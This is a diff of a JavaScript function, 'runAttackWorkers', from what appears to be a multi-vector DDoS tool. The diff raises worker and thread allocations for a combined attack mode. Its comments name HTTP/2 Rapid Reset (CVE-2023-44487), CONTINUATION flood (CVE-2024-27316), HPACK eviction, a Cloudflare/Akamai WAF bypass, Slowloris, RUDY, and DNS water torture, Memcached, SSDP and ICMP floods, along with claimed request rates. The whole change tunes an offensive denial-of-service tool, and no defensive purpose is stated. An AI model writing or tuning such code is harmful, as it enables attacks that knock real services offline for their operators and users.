@@ -238,10 +238,10 @@ async function runAttackWorkers(
   if (method === "geass-override") {
     const connW   = 2;  // 2×: double connection flood workers for nginx exhaustion
     const slowW   = 2;  // 2×: 2 workers × 50K Slowloris = 100K half-open connections
-    const h2W     = Math.max(3, Math.ceil(CPU_COUNT * 0.35));  // ≥3 — CVE-2023-44487 PING+RST dominant
-    const contW   = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — CVE-2024-27316 OOM (16KB frames)
-    const hpackW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — HPACK table eviction
-    const wafW    = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — CF/Akamai bypass fingerprint
+    const h2W     = Math.max(4, Math.ceil(CPU_COUNT * 0.40));  // ≥4 — CVE-2023-44487 PING+RST dominant
+    const contW   = Math.max(4, Math.ceil(CPU_COUNT * 0.30));  // ≥4 — CVE-2024-27316 OOM (16KB frames)
+    const hpackW  = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — HPACK table eviction
+    const wafW    = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — CF/Akamai bypass fingerprint
     const wsW     = 1;
     const gqlW    = 1;
     const rudyW   = 2;  // 2×: multipart + classic RUDY
@@ -249,8 +249,8 @@ async function runAttackWorkers(
     const tlsW    = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — RSA renegotiation is CPU intensive
     const quicW   = 1;  // QUIC/H3 — UDP single worker
     const sslW    = 1;  // SSL Death Record
-    const stormW  = Math.max(2, Math.ceil(CPU_COUNT * 0.25));  // ≥2 — H2 Settings Storm
-    const pipeW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — HTTP Pipeline 300K req/s per worker
+    const stormW  = Math.max(3, Math.ceil(CPU_COUNT * 0.30));  // ≥3 — H2 Settings Storm
+    const pipeW   = Math.max(3, Math.ceil(CPU_COUNT * 0.28));  // ≥3 — HTTP Pipeline 300K req/s per worker
     // L3/UDP vectors — each uses a single worker with high socket concurrency
     const icmpW   = 1;  // ICMP Flood — raw-socket / hping3 / UDP saturation
     const dnsW    = 1;  // DNS Water Torture — floods target NS servers
@@ -258,14 +258,14 @@ async function runAttackWorkers(
     const memW    = 1;  // Memcached UDP flood
     const ssdpW   = 1;  // SSDP M-SEARCH flood
 
-    // Thread budget — 32GB/8vCPU optimized (20-vector VIGINTUS split)
+    // Thread budget — 32GB/8vCPU optimized (21-vector ARES OMNIVECT split)
     // Heavy hitters: H2 RST, H2 CONTINUATION, H2 Storm, WAF Bypass, HTTP Pipeline
     const connT   = Math.max(100, Math.round(threads * 0.06));
     const slowT   = Math.max(100, Math.round(threads * 0.06));
-    const h2T     = Math.max(300, Math.round(threads * 0.22)); // ★ CVE-2023-44487 dominant
-    const contT   = Math.max(200, Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM
-    const hpackT  = Math.max(150, Math.round(threads * 0.12)); // ★ HPACK eviction storm
-    const wafT    = Math.max(150, Math.round(threads * 0.15)); // ★ CF/Akamai WAF bypass
+    const h2T     = Math.max(350, Math.round(threads * 0.26)); // ★ CVE-2023-44487 dominant
+    const contT   = Math.max(220, Math.round(threads * 0.20)); // ★ CVE-2024-27316 OOM
+    const hpackT  = Math.max(180, Math.round(threads * 0.15)); // ★ HPACK eviction storm
+    const wafT    = Math.max(180, Math.round(threads * 0.18)); // ★ CF/Akamai WAF bypass
     const wsT     = Math.max(80,  Math.round(threads * 0.06));
     const gqlT    = Math.max(50,  Math.round(threads * 0.04));
     const udpT    = Math.max(64,  Math.round(threads * 0.04));
@@ -274,8 +274,8 @@ async function runAttackWorkers(
     const tlsT    = Math.max(50,  Math.round(threads * 0.04));
     const quicT   = Math.max(32,  Math.round(threads * 0.03));
     const sslT    = Math.max(60,  Math.round(threads * 0.05));
-    const stormT  = Math.max(150, Math.round(threads * 0.18)); // ★ H2 Settings Storm proven
-    const pipeT   = Math.max(400, Math.round(threads * 0.25)); // ★ HTTP Pipeline 300K req/s per worker
+    const stormT  = Math.max(180, Math.round(threads * 0.22)); // ★ H2 Settings Storm proven
+    const pipeT   = Math.max(450, Math.round(threads * 0.32)); // ★ HTTP Pipeline 300K req/s per worker
     // L3/UDP — each gets its own thread pool; single worker uses all threads as socket count
     const icmpT   = Math.max(64,  Math.round(threads * 0.08)); // ICMP: 64 sockets saturates 1Gbps link
     const dnsT    = Math.max(64,  Math.round(threads * 0.06)); // DNS Water Torture: 64 UDP sockets
